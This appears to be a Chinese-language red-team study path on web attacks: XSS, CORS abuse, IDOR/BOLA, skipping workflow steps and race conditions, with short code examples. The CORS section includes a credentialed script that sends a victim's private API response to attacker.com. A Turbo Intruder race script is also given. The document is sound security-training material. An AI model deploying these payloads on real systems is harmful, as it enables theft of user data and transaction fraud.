# 🌐 瀏覽器同源策略信任與業務併發競態深度學習路徑 (Browser Trust & Business Logic)
> 對應紅隊作戰矩陣：**Phase 2 (R09、R14、R15)** (R09.1 ~ R09.5, R14.1 ~ R14.5, R15.1 ~ R15.3)  
> 預計總投入時間：**30 ~ 35 小時**（視 DOM 運作模型、瀏覽器安全策略與分散式系統併發機制基礎而定）

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                         這份路徑帶你到達的位置
──────────────────                   ────────────────────────────
XSS 只會彈出 alert(1) 視窗   ──►     精通 DOM 污點資料流追蹤與持久化 Session 劫持
只懂基礎 CSRF 概念           ──►     精通 SameSite Cookie 限制繞過與 CORS 信任濫用
測業務邏輯只會手動亂按按鈕   ──►     精通 Turbo Intruder 單連線多請求併發競態 (Race) 突破
```

---

## 🧱 第零關：先確認你有這些基礎

| 概念 | 需要了解到的程度 | 快速補充資源 |
|------|-----------------|-------------|
| 同源政策 (Same-Origin Policy, SOP) | 理解 Protocol, Host, Port 三者對 DOM 與 Ajax 存取的嚴格隔離 | [MDN: Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) |
| Cookie 屬性安全機制 | 熟悉 `HttpOnly`, `Secure`, `SameSite=Strict/Lax/None` 語意 | [RFC 6265bis: Cookies](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis) |
| 資料庫事務與隔離層級 | 理解 ACID、排他鎖 (Exclusive Lock) 與併發資料不一致 | [MySQL 8.0: Transaction Isolation Levels](https://dev.mysql.com/doc/refman/8.0/en/innodb-transaction-isolation-levels.html) |

---

## 🗺️ 整體學習地圖（五個階段）

```
階段一 ──────► 階段二 ──────► 階段三 ──────► 階段四 ──────► 階段五
XSS污點分析   CSRF/CORS濫用  BOLA/BFLA越權  業務狀態機繞過 併發競態條件
(8h)           (6h)           (6h)           (6h)           (8h)
```

---

## ⚡ 階段一：跨站腳本 (XSS) 污點分析與進階利用（約 8 小時）

### 1.1 DOM-based XSS Sources 與 Sinks 追蹤
現代前端單頁應用程式 (SPA) 的核心攻擊面在於客戶端 JavaScript：
- **常見污染源 (Sources)**：`location.search`, `location.hash`, `document.referrer`, `window.name`。
- **危險執行點 (Sinks)**：`eval()`, `setTimeout()`, `document.write()`, `element.innerHTML`。
- **繞過現代 CSP (內容安全策略)**：利用信任的 CDN 域名（如 `cdnjs.cloudflare.com` 上的 AngularJS 漏洞）進行 CSP Bypass。

---

## 🛡️ 階段二：跨來源資源共用 (CORS) 信任配置濫用（約 6 小時）

### 2.1 動態反射 Origin 與 Null 信任漏洞
當後端將請求標頭的 `Origin` 盲目反射回 `Access-Control-Allow-Origin` 並開啟 `Access-Control-Allow-Credentials: true` 時：
```javascript
// 攻擊者網站上的惡意竊密腳本
var req = new XMLHttpRequest();
req.onload = function() {
    fetch('http://attacker.com/log?data=' + encodeURIComponent(this.responseText));
};
req.open('GET', 'https://target.com/api/user/private-profile', true);
req.withCredentials = true;
req.send();
```

---

## 🔑 階段三：物件與功能層級存取控制失效 (BOLA / BFLA)（約 6 小時）

### 3.1 橫向越權 (IDOR) 與縱向特權提升
- **BOLA (Broken Object Level Authorization)**：將 `/api/documents/1001` 修改為 `/1002`，系統未校驗當前 Session 是否為該文件所有者。
- **BFLA (Broken Function Level Authorization)**：普通使用者直接發送 `DELETE /api/users/42` 或透過修改 HTTP 動詞（`GET` 變為 `POST`/`PUT`）繞過權限過濾器。

---

## 🔄 階段四：業務工作流程狀態機躍遷繞過（約 6 小時）

### 4.1 電商與業務流程順序篡改
系統未在資料庫維護嚴格的狀態機（State Machine）：
- 正常流程：`加購物車 (步驟1)` ➔ `核對金額 (步驟2)` ➔ `付款扣款 (步驟3)` ➔ `確認出貨 (步驟4)`。
- 繞過手法：直接跳過「付款扣款」直接向「確認出貨」端點發送請求；或在結帳時傳入負數金額、超大金額造成整數溢位。

---

## 🏎️ 階段五：應用程式併發競態條件 (Race Condition)（約 8 小時）

### 5.1 Limit-Overrun (限額溢出) 物理原理解析
當後端在「檢查狀態」與「寫入資料」之間存在時間差 (Time-of-Check to Time-of-Use, TOCTOU)，且未實施行級排他鎖 (`SELECT ... FOR UPDATE`)：
```
執行緒 1: 查詢餘額 ($100) ───► (大於 $80，允許提領) ───► 扣除 $80 (餘額剩 $20)
執行緒 2: 查詢餘額 ($100) ───► (大於 $80，允許提領) ───► 扣除 $80 (餘額變負數！)
```

### 5.2 Turbo Intruder 單連線多請求同步技術
利用 HTTP/2 單一 TCP 連線多路複用特性，將數十個請求預先發送至目標網路介面緩衝區，並在最後一個位元組同時釋放，達成毫秒級並發碰撞：
```python
# Turbo Intruder race condition 測試範例
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

---

## ✅ 本路徑通過檢查表（Checklist）

- [ ] 能在瀏覽器 DevTools 中定位 DOM XSS 污染鏈路徑。
- [ ] 能構造標準 CORS 漏洞利用頁面竊取受害者的敏感 JSON API 回應。
- [ ] 掌握 BOLA/IDOR 的自動化遍歷與驗證腳本編寫。
- [ ] 能辨識業務狀態機躍遷缺陷並構造跳步利用。
- [ ] 熟練使用 Turbo Intruder 實施單連線 HTTP/2 競態條件攻擊，達成優惠券或提領次數溢出。
